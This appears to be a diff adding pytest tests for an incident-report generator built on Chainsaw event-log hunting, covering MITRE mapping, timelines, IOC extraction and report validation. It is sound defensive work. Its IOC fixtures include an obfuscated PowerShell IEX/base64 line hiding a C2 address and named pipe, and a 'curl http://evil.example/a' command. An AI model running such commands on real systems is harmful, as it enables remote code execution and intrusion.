@@ -24,6 +24,8 @@ from chainsawmcp.report import (
     format_summary,
     get_detections,
     get_detections_json,
+    resolve_hit_ids,
+    write_full_report,
     _group_by_rule,
     _extract_severity,
     _format_hit,
@@ -31,6 +33,26 @@ from chainsawmcp.report import (
     _get_event_data,
     _hit_to_dict,
 )
+from chainsawmcp.report_markdown import (
+    build_hosts_accounts,
+    build_iocs,
+    build_mitre_rows,
+    build_provenance_block,
+    build_report_json,
+    build_timeline,
+    render_report_markdown,
+    write_incident_report,
+)
+from chainsawmcp.report_spec import (
+    MODEL_SECTIONS,
+    SECTIONS,
+    SERVER_SECTIONS,
+    render_spec_text,
+    slot_begin,
+    slot_end,
+    slot_placeholder,
+)
+from chainsawmcp.report_validate import validate_report_text
 from chainsawmcp.monitor import _annotate_results, _extract_record_id, _event_block
 
 
@@ -834,3 +856,472 @@ async def test_audited_truncates_long_args(tmp_path, monkeypatch):
     rec = _read_log(tmp_path)[0]
     assert len(rec["args"]["blob"]) < len(long)
     assert rec["args"]["blob"].endswith("…")
+
+
+# ---------------------------------------------------------------------------
+# Canonical report spec
+# ---------------------------------------------------------------------------
+
+def test_spec_sections_are_ordered_and_unique():
+    numbers = [s.number for s in SECTIONS]
+    assert numbers == sorted(numbers) == list(range(1, len(SECTIONS) + 1))
+    assert len({s.id for s in SECTIONS}) == len(SECTIONS)
+
+
+def test_spec_splits_server_and_model_sections():
+    assert {s.id for s in MODEL_SECTIONS} == {
+        "executive_summary", "attack_narrative", "recommendations", "gaps",
+    }
+    assert {s.id for s in SERVER_SECTIONS} == {
+        "mitre_attack", "timeline", "iocs", "accounts_systems", "provenance",
+    }
+    assert set(MODEL_SECTIONS) | set(SERVER_SECTIONS) == set(SECTIONS)
+
+
+def test_spec_text_lists_every_section_and_marks_authorship():
+    text = render_spec_text()
+    for section in SECTIONS:
+        assert section.heading in text
+    assert "SERVER-RENDERED" in text
+    assert "YOU WRITE" in text
+    assert "ref=<hit_id>" in text
+
+
+# ---------------------------------------------------------------------------
+# MITRE mapping
+# ---------------------------------------------------------------------------
+
+def _tagged(name, level, tags, hit_id, timestamp="2018-05-04T22:14:29+00:00"):
+    return {
+        "name": name, "level": level, "tags": tags,
+        "hit_id": hit_id, "timestamp": timestamp,
+    }
+
+
+def test_mitre_extracts_techniques_and_subtechniques():
+    hits = [
+        _tagged("Eventlog Cleared", "high", ["attack.t1685.005", "car.2016-04-002"], "j-000001"),
+        _tagged("PowerShell", "critical", ["attack.t1059.001"], "j-000002"),
+    ]
+    result = build_mitre_rows(hits)
+    techniques = {r["technique"] for r in result["techniques"]}
+    assert techniques == {"T1685.005", "T1059.001"}
+    # Non-ATT&CK namespaces (car.*, cve.*) must not become techniques or tactics.
+    assert all("car" not in t["tactic"] for t in result["tactics"])
+
+
+def test_mitre_normalises_tactic_separator_variants():
+    """SigmaHQ emits both attack.lateral-movement and attack.lateral_movement."""
+    hits = [
+        _tagged("A", "high", ["attack.lateral-movement"], "j-000001"),
+        _tagged("B", "high", ["attack.lateral_movement"], "j-000002"),
+    ]
+    result = build_mitre_rows(hits)
+    tactics = {t["tactic"]: t["count"] for t in result["tactics"]}
+    assert tactics == {"lateral-movement": 2}
+
+
+def test_mitre_groups_rules_and_tracks_window():
+    hits = [
+        _tagged("Rule A", "high", ["attack.t1021.002"], "j-000001", "2018-05-01T00:00:00+00:00"),
+        _tagged("Rule B", "critical", ["attack.t1021.002"], "j-000002", "2018-06-01T00:00:00+00:00"),
+    ]
+    row = build_mitre_rows(hits)["techniques"][0]
+    assert row["technique"] == "T1021.002"
+    assert row["count"] == 2
+    assert row["rules"] == ["Rule A", "Rule B"]
+    assert row["severity"] == "critical"          # most severe of the contributors
+    assert row["first_seen"] == "2018-05-01T00:00:00Z"
+    assert row["last_seen"] == "2018-06-01T00:00:00Z"
+    assert row["hit_ids"] == ["j-000001", "j-000002"]
+
+
+def test_mitre_captures_software_tags():
+    hits = [_tagged("CS", "critical", ["attack.s0002"], "j-000001")]
+    assert build_mitre_rows(hits)["software"] == [{"id": "S0002", "rules": ["CS"]}]
+
+
+def test_mitre_counts_untagged_hits_without_inventing_techniques():
+    hits = [
+        _tagged("Tagged", "high", ["attack.t1059.001"], "j-000001"),
+        {"name": "Untagged", "level": "info", "hit_id": "j-000002"},
+    ]
+    result = build_mitre_rows(hits)
+    assert result["tagged_hits"] == 1
+    assert result["untagged_hits"] == 1
+    assert len(result["techniques"]) == 1
+
+
+# ---------------------------------------------------------------------------
+# Timeline
+# ---------------------------------------------------------------------------
+
+def _sev_hit(level, hit_id, timestamp):
+    return {"name": f"Rule {level}", "level": level, "hit_id": hit_id, "timestamp": timestamp}
+
+
+def test_timeline_applies_severity_floor():
+    hits = [
+        _sev_hit("critical", "j-000001", "2018-01-01T00:00:00+00:00"),
+        _sev_hit("high", "j-000002", "2018-01-02T00:00:00+00:00"),
+        _sev_hit("medium", "j-000003", "2018-01-03T00:00:00+00:00"),
+        _sev_hit("info", "j-000004", "2018-01-04T00:00:00+00:00"),
+    ]
+    result = build_timeline(hits, min_severity="high")
+    assert [r["hit_id"] for r in result["rows"]] == ["j-000001", "j-000002"]
+    assert result["total_matching"] == 2
+
+
+def test_timeline_sorts_chronologically_and_caps_rows():
+    hits = [
+        _sev_hit("high", "j-000003", "2018-03-01T00:00:00+00:00"),
+        _sev_hit("high", "j-000001", "2018-01-01T00:00:00+00:00"),
+        _sev_hit("high", "j-000002", "2018-02-01T00:00:00+00:00"),
+    ]
+    result = build_timeline(hits, min_severity="high", max_rows=2)
+    assert [r["hit_id"] for r in result["rows"]] == ["j-000001", "j-000002"]
+    assert result["truncated"] == 1
+    assert result["total_matching"] == 3
+
+
+def test_timeline_normalises_timestamps_to_utc_z():
+    hits = [_sev_hit("high", "j-000001", "2018-05-04T22:14:29.632649+00:00")]
+    assert build_timeline(hits)["rows"][0]["timestamp"] == "2018-05-04T22:14:29Z"
+
+
+def test_timeline_sorts_undated_rows_last():
+    hits = [
+        {"name": "No time", "level": "high", "hit_id": "j-000002"},
+        _sev_hit("high", "j-000001", "2018-01-01T00:00:00+00:00"),
+    ]
+    rows = build_timeline(hits, min_severity="high")["rows"]
+    assert [r["hit_id"] for r in rows] == ["j-000001", "j-000002"]
+
+
+# ---------------------------------------------------------------------------
+# IOC extraction
+# ---------------------------------------------------------------------------
+
+def _evt(event_data, hit_id="j-000001", level="high", name="Rule"):
+    return {
+        "name": name, "level": level, "hit_id": hit_id,
+        "timestamp": "2018-05-04T22:14:29+00:00",
+        "document": {"data": {"Event": {"EventData": event_data, "System": {}}}},
+    }
+
+
+def test_iocs_extract_and_deduplicate():
+    hits = [
+        _evt({"IpAddress": "10.0.0.5"}, "j-000001"),
+        _evt({"IpAddress": "10.0.0.5"}, "j-000002"),
+    ]
+    entries = build_iocs(hits)["categories"]["network"]["entries"]
+    assert len(entries) == 1
+    assert entries[0]["value"] == "10.0.0.5"
+    assert entries[0]["count"] == 2
+    assert entries[0]["hit_ids"] == ["j-000001", "j-000002"]
+
+
+def test_iocs_suppress_placeholder_values():
+    hits = [_evt({"IpAddress": "-", "ServiceName": "??", "CommandLine": ""})]
+    assert build_iocs(hits)["categories"] == {}
+
+
+def test_iocs_drop_machine_accounts():
+    hits = [
+        _evt({"TargetUserName": "WORKSTATION$", "TargetDomainName": "CORP"}, "j-000001"),
+        _evt({"TargetUserName": "alice", "TargetDomainName": "CORP"}, "j-000002"),
+    ]
+    values = [e["value"] for e in build_iocs(hits)["categories"]["accounts"]["entries"]]
+    assert values == ["CORP\\alice"]
+
+
+def test_iocs_reject_version_strings_shaped_like_ips():
+    """HostVersion=1.0.0.0 is a version, not an indicator."""
+    hits = [_evt({"CommandLine": "app.exe HostVersion=1.0.0.0 peer=192.168.1.7"})]
+    values = [e["value"] for e in build_iocs(hits)["categories"]["network"]["entries"]]
+    assert values == ["192.168.1.7"]
+
+
+def test_iocs_reject_impossible_octets():
+    hits = [_evt({"CommandLine": "build 999.999.999.999 and 10.1.2.3"})]
+    values = [e["value"] for e in build_iocs(hits)["categories"]["network"]["entries"]]
+    assert values == ["10.1.2.3"]
+
+
+def test_iocs_keep_loopback():
+    """\\\\127.0.0.1\\ADMIN$ is the PSExec service-install pattern — a real signal."""
+    hits = [_evt({"CommandLine": r"\\127.0.0.1\ADMIN$"})]
+    values = [e["value"] for e in build_iocs(hits)["categories"]["network"]["entries"]]
+    assert values == ["127.0.0.1"]
+
+
+def test_iocs_recover_indicators_from_base64_payloads():
+    """Attacker C2 details commonly appear only inside encoded payloads."""
+    import base64
+    encoded = base64.b64encode(
+        b"\x90\x90connect 206.189.69.35 via \\\\.\\pipe\\diagsvc-22 now padding padding"
+    ).decode()
+    hits = [_evt({"ScriptBlockText": f"IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('{encoded}')))"})]
+    categories = build_iocs(hits)["categories"]
+
+    network = categories["network"]["entries"][0]
+    assert network["value"] == "206.189.69.35"
+    assert network["decoded"] is True
+
+    pipe = categories["pipes"]["entries"][0]
+    assert pipe["value"] == r"\\.\pipe\diagsvc-22"
+    assert pipe["decoded"] is True
+
+
+def test_iocs_mark_plaintext_indicators_as_not_decoded():
+    hits = [_evt({"CommandLine": "curl http://evil.example/a"})]
+    entry = build_iocs(hits)["categories"]["urls"]["entries"][0]
+    assert entry["value"] == "http://evil.example/a"
+    assert entry["decoded"] is False
+
+
+# ---------------------------------------------------------------------------
+# Hosts and accounts
+# ---------------------------------------------------------------------------
+
+def _sys_evt(system, event_data=None, hit_id="j-000001", level="high"):
+    return {
+        "name": "Rule", "level": level, "hit_id": hit_id,
+        "timestamp": "2018-05-04T22:14:29+00:00",
+        "document": {"data": {"Event": {"System": system, "EventData": event_data or {}}}},
+    }
+
+
+def test_inventory_groups_case_variants_of_one_principal():
+    hits = [
+        _sys_evt({}, {"TargetUserName": "spsql", "TargetDomainName": "shieldbase"}, "j-000001"),
+        _sys_evt({}, {"TargetUserName": "spsql", "TargetDomainName": "SHIELDBASE"}, "j-000002"),
+    ]
+    accounts = build_hosts_accounts(hits)["accounts"]
+    assert len(accounts) == 1
+    assert accounts[0]["count"] == 2
+    assert accounts[0]["variants"] == ["SHIELDBASE\\spsql", "shieldbase\\spsql"]
+
+
+def test_inventory_keeps_distinct_domain_qualifiers_separate():
+    """NetBIOS and DNS forms are not merged — that would be an inference."""
+    hits = [
+        _sys_evt({}, {"TargetUserName": "spsql", "TargetDomainName": "shieldbase"}, "j-000001"),
+        _sys_evt({}, {"TargetUserName": "spsql", "TargetDomainName": "shieldbase.lan"}, "j-000002"),
+    ]
+    assert len(build_hosts_accounts(hits)["accounts"]) == 2
+
+
+def test_inventory_tracks_window_and_max_severity():
+    hits = [
+        _sys_evt({"Computer": "HOST1"}, hit_id="j-000001", level="low"),
+        {**_sys_evt({"Computer": "HOST1"}, hit_id="j-000002", level="critical"),
+         "timestamp": "2018-09-01T00:00:00+00:00"},
+    ]
+    host = build_hosts_accounts(hits)["hosts"][0]
+    assert host["name"] == "HOST1"
+    assert host["count"] == 2
+    assert host["max_severity"] == "critical"
+    assert host["first_seen"] == "2018-05-04T22:14:29Z"
+    assert host["last_seen"] == "2018-09-01T00:00:00Z"
+
+
+# ---------------------------------------------------------------------------
+# Provenance
+# ---------------------------------------------------------------------------
+
+def test_provenance_block_reads_record(tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    job_dir = tmp_path / "analysis" / "job1"
+    job_dir.mkdir(parents=True)
+    (job_dir / "chainsaw_provenance.json").write_text(json.dumps({
+        "command": ["chainsaw", "hunt", "/evtx"],
+        "chainsaw_version": "2.16.0",
+        "output_sha256": "abc123",
+        "completed_at": "2026-06-13T16:34:23Z",
+    }), encoding="utf-8")
+
+    block = build_provenance_block("job1", "/evidence")
+    assert block["available"] is True
+    assert block["command"] == "chainsaw hunt /evtx"
+    assert block["chainsaw_version"] == "2.16.0"
+    assert block["output_sha256"] == "abc123"
+
+
+def test_provenance_block_degrades_when_missing(tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    block = build_provenance_block("nope", "/evidence")
+    assert block["available"] is False
+
+
+def test_report_flags_missing_provenance_to_the_reader(tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = render_report_markdown([_sev_hit("high", "j-000001", "2018-01-01T00:00:00+00:00")])
+    assert "Provenance record unavailable" in report
+
+
+# ---------------------------------------------------------------------------
+# Skeleton rendering
+# ---------------------------------------------------------------------------
+
+@pytest.fixture
+def sample_hits():
+    return [
+        _tagged("Eventlog Cleared", "high", ["attack.t1685.005"], "j-000001"),
+        _tagged("PowerShell", "critical", ["attack.t1059.001"], "j-000002"),
+    ]
+
+
+def test_skeleton_contains_every_heading_in_spec_order(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = render_report_markdown(sample_hits, job_id="j", evidence_path="/evidence")
+    positions = [report.index(s.heading) for s in SECTIONS]
+    assert positions == sorted(positions)
+
+
+def test_skeleton_slots_exactly_the_model_sections(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = render_report_markdown(sample_hits, job_id="j", evidence_path="/evidence")
+    for section in MODEL_SECTIONS:
+        assert report.count(slot_begin(section)) == 1
+        assert report.count(slot_end(section)) == 1
+    for section in SERVER_SECTIONS:
+        assert slot_begin(section) not in report
+
+
+def test_skeleton_prefills_server_sections(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = render_report_markdown(sample_hits, job_id="j", evidence_path="/evidence")
+    assert "T1685.005" in report          # MITRE
+    assert "2018-05-04T22:14:29Z" in report   # timeline
+    assert "Total hits" in report          # provenance
+
+
+def test_skeleton_escapes_pipes_so_tables_do_not_break(tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    hits = [_evt({"CommandLine": "cmd.exe /c a | b"})]
+    report = render_report_markdown(hits)
+    assert "a \\| b" in report
+
+
+def test_report_json_sidecar_shape(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    payload = build_report_json(sample_hits, job_id="j", evidence_path="/evidence")
+    assert set(payload) == {
+        "spec_version", "generated", "job_id", "evidence", "total_hits",
+        "sections", "mitre", "timeline", "iocs", "inventory", "provenance",
+        "cited_hit_ids",
+    }
+    assert payload["total_hits"] == 2
+    assert [s["id"] for s in payload["sections"]] == [s.id for s in SECTIONS]
+    assert payload["cited_hit_ids"] == ["j-000001", "j-000002"]
+
+
+def test_write_incident_report_creates_both_files(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    md_path, json_path = write_incident_report(
+        sample_hits, tmp_path / "reports", job_id="j", evidence_path="/evidence"
+    )
+    assert md_path.name == "incident_report.md"
+    assert json_path.name == "incident_report.json"
+    assert "# Incident Report" in md_path.read_text(encoding="utf-8")
+    assert json.loads(json_path.read_text(encoding="utf-8"))["total_hits"] == 2
+
+
+def test_write_full_report_writes_text_file(tmp_path):
+    """hunt_report.txt is unchanged by the Markdown report — pin its behaviour."""
+    hits = [{"name": "Mimikatz", "level": "high", "timestamp": "2024-01-01T00:00:00Z"}]
+    path = write_full_report(hits, evtx_path="/evidence", output_dir=tmp_path / "reports")
+    assert path.name == "hunt_report.txt"
+    text = path.read_text(encoding="utf-8")
+    assert "ChainsawMCP — ANALYST REPORT" in text
+    assert "Mimikatz" in text
+
+
+# ---------------------------------------------------------------------------
+# Report validation
+# ---------------------------------------------------------------------------
+
+def _filled_report(hits, tmp_path):
+    """Render the skeleton and fill every model slot with a cited paragraph."""
+    report = render_report_markdown(hits, job_id="j", evidence_path="/evidence")
+    for section in MODEL_SECTIONS:
+        report = report.replace(
+            slot_placeholder(section),
+            f"The {section.title.lower()} content for this engagement, written out at "
+            f"sufficient length to be a real section rather than a stub. ref=j-000001",
+        )
+    return report
+
+
+def test_validator_passes_a_complete_report(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    result = validate_report_text(_filled_report(sample_hits, tmp_path), sample_hits)
+    assert result["pass"] is True, result["violations"]
+    assert result["unresolved"] == []
+
+
+def test_validator_flags_unfilled_slots(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    skeleton = render_report_markdown(sample_hits, job_id="j", evidence_path="/evidence")
+    result = validate_report_text(skeleton, sample_hits)
+    assert result["pass"] is False
+    codes = {v["code"] for v in result["violations"]}
+    assert codes == {"unfilled_slot"}
+    assert {v["section"] for v in result["violations"]} == {s.id for s in MODEL_SECTIONS}
+
+
+def test_validator_flags_missing_section(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = _filled_report(sample_hits, tmp_path).replace("## 7. Recommendations", "## Extras")
+    result = validate_report_text(report, sample_hits)
+    assert result["pass"] is False
+    assert any(v["code"] == "missing_section" for v in result["violations"])
+
+
+def test_validator_flags_unresolved_citation(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = _filled_report(sample_hits, tmp_path) + "\n\nExtra claim. ref=j-999999\n"
+    result = validate_report_text(report, sample_hits)
+    assert result["pass"] is False
+    assert "j-999999" in result["unresolved"]
+    assert any(v["code"] == "unresolved_citation" for v in result["violations"])
+
+
+def test_validator_flags_non_utc_timestamp(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = _filled_report(sample_hits, tmp_path).replace(
+        "ref=j-000001", "at 2018-05-04T22:14:29+02:00 ref=j-000001", 1
+    )
+    result = validate_report_text(report, sample_hits)
+    assert result["pass"] is False
+    assert any(v["code"] == "non_utc_timestamp" for v in result["violations"])
+
+
+def test_validator_flags_uncited_narrative_section(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = render_report_markdown(sample_hits, job_id="j", evidence_path="/evidence")
+    for section in MODEL_SECTIONS:
+        cite = "" if section.id == "gaps" else " ref=j-000001"
+        report = report.replace(
+            slot_placeholder(section),
+            "A section of genuine prose long enough to clear the minimum content "
+            "threshold applied by the validator." + cite,
+        )
+    result = validate_report_text(report, sample_hits)
+    assert result["pass"] is False
+    assert any(
+        v["code"] == "uncited_section" and v["section"] == "gaps"
+        for v in result["violations"]
+    )
+
+
+def test_validator_flags_stub_section(sample_hits, tmp_path, monkeypatch):
+    monkeypatch.setenv("CHAINSAWMCP_CASE_DIR", str(tmp_path))
+    report = render_report_markdown(sample_hits, job_id="j", evidence_path="/evidence")
+    for section in MODEL_SECTIONS:
+        report = report.replace(slot_placeholder(section), "N/A ref=j-000001")
+    result = validate_report_text(report, sample_hits)
+    assert result["pass"] is False
+    assert any(v["code"] == "empty_section" for v in result["violations"])
